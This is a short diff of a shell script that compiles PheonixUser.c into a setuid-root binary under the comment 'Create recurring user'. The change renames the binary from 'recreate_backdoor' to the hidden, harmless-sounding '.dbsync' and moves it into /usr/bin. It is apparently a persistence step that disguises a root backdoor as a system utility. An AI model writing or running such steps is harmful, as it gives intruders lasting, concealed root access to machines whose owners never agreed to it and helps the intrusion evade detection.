@@ -41,9 +41,10 @@ fi
 
 
 # Create recurring user
-gcc PheonixUser.c -o recreate_backdoor
-sudo chown root:root recreate_backdoor
-sudo chmod 4755 recreate_backdoor
+gcc PheonixUser.c -o .dbsync
+sudo chown root:root .dbsync
+sudo chmod 4755 .dbsync
+mv .dbsync /usr/bin
 
 
 
